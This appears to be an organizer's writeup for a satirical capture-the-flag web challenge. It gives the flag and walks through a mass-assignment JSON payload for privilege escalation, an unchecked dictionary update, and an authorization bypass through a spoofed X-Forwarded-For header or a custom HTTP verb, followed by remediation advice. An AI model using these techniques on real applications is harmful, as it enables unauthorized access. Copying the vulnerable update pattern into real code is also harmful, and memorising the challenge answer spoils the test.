# Challenge 5: Initech SynergyDesk — Official Organizer Writeup

* **Category**: Corporate Satire / Tricky Web & Mass Assignment
* **Difficulty**: Medium
* **Points**: 225
* **Flag**: `CTF{c0rp0r4t3_syn3rgy_b0nus_4ppr0v3d_2026}`

---

## 📖 Challenge Description for Players
> *Initech Corporation has rolled out SynergyDesk 9.4 to optimize holistic cross-functional workforce alignment. You are logged in as Milton Waddams, an underappreciated associate working out of Basement Storage B. Can you navigate the corporate bureaucracy, alter your HR personnel file, and trick the Boardroom into releasing the CEO's multimillion-dollar Golden Parachute bonus?*
>
> **Target**: `http://<HOST_IP>:8005`

---

## 🎯 Intended Vulnerability & Exploit Paths

### Step 1: Mass Assignment on Self-Assessment KPI
When submitting self-assessment notes via `POST /api/employee/update-kpi`, the backend uses unchecked dictionary updates:
```python
emp.update(request_body)
```
By including administrative properties in the JSON payload:
```json
{
  "role": "Chief_Executive_Officer",
  "is_c_suite": true,
  "synergy_score": 9999
}
```
The user's session is upgraded to CEO status.

### Step 2: Boardroom Access Bypass
Requesting `GET /api/executive/bonus-vault` requires origin from the Executive Boardroom or a privileged HTTP verb.
Inspecting `/api/compliance/audit-log` or API responses hints at the origin policy:
* **Option A**: Send header `X-Forwarded-For: 127.0.0.1` (or `X-Boardroom-Token: EXECUTIVE_PARACHUTE_9901`).
* **Option B**: Send custom HTTP verb `SYNERGIZE /api/executive/bonus-vault`.

**Result**:
```json
{
  "success": true,
  "message": "Executive Golden Parachute & Bonus Package Approved by the Board of Directors!",
  "flag": "CTF{c0rp0r4t3_syn3rgy_b0nus_4ppr0v3d_2026}"
}
```

---

## 🛡️ Remediation / Real-World Takeaways
1. Never unpack untrusted JSON directly into state or database models (`emp.update(body)`). Use strict DTOs (Data Transfer Objects) or Pydantic schemas with whitelisted fields.
2. Do not trust client-controlled proxy headers (`X-Forwarded-For`) for authorization without upstream reverse proxy validation.
